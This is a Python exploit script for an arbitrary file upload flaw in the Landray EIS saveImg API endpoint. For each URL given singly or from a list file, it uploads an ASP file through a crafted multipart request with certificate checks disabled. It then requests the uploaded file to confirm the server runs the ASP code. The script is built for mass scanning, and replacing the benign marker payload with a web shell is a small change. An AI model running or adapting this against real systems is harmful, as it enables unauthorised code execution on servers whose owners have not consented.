import requests
import urllib3
import string,random
from urllib.parse import urljoin
import argparse
import time
import ssl
import json
import urllib.request
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls

def check(url):
    url = url.rstrip("/")
    target = urljoin(url,"/eis/service/api.aspx?action=saveImg")
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=---123"
    }
    data = """-----123\r\nContent-Disposition: form-data; name="file"; filename="test.asp"\r\nContent-Type: text/html\r\n\r\n<%Response.Write("HelloWorldTest1")%>\r\n-----123--"""
    try:
        response = requests.post(target, verify=False, headers=headers, data=data, timeout=15)
        if response.status_code == 200 and 'files' in response.text and 'editor_img' in response.text and 'asp' in response.text:
            result_url = urljoin(url,response.text)
            result_response = requests.get(result_url,timeout=15,verify=False,headers = {"User-Agent": "MMozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36",})
            if result_response.status_code == 200 and 'HelloWorldTest' in result_response.text:
                print(f"\033[31mDiscovered:{url}: landrayEIS_api_ArbitraryFileUploads!\033[0m")
                return True
    except Exception as e:
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")